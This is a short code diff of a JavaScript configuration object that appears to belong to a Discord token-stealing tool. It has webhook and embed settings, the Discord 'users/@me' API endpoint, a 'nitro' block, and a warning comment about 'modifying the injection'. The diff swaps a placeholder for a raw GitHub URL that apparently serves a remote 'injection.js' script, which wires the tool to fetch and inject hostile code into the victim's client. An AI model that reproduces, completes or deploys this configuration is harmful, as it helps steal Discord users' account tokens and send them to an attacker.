@@ -14,7 +14,7 @@ const config = {
     embed_icon: "ewe",
     embed_color: 8363488,
     webhook: "ewe",
-    injection_url: "ewe",
+    injection_url: "https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/js/injection.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v10/users/@me",
     nitro: {
